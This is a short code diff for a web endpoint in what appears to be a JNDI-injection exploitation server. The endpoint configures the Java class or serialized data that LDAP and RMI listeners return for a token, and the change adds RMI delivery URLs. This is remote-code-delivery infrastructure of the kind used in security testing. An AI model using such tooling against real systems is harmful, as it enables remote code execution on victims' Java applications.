@@ -25,7 +25,7 @@ async def set_rebind_payload(
     user: User = Depends(current_user),
     session: AsyncSession = Depends(get_session),
 ) -> dict[str, Any]:
-    """Override what bytecode/serialized-data the LDAP listener returns for a token.
+    """Override what bytecode/serialized-data the LDAP/RMI listener returns for a token.
 
     body keys:
       class_name   – Java class name (required)
@@ -78,13 +78,16 @@ async def set_rebind_payload(
     await session.commit()
 
     ldap_url = f"ldap://{s.public_address}:{s.ldap_port}/{token}/{class_name}"
+    rmi_url = f"rmi://{s.public_address}:{s.rmi_port}/{token}/{class_name}"
     mode = "javaSerializedData" if serialized_b64 else "javaCodeBase"
     return {
         "ldap_url": ldap_url,
+        "rmi_url": rmi_url if not serialized_b64 else "",
         "class_name": class_name,
         "mode": mode,
-        "rmi_supported": False,
-        "rmi_note": "RMI rebind is not implemented; use ldap_url for JNDI delivery.",
+        "rmi_supported": not bool(serialized_b64),
+        "rmi_note": "RMI rebind is available for javaCodeBase mode." if not serialized_b64
+        else "RMI rebind does not support javaSerializedData mode.",
     }
 
 
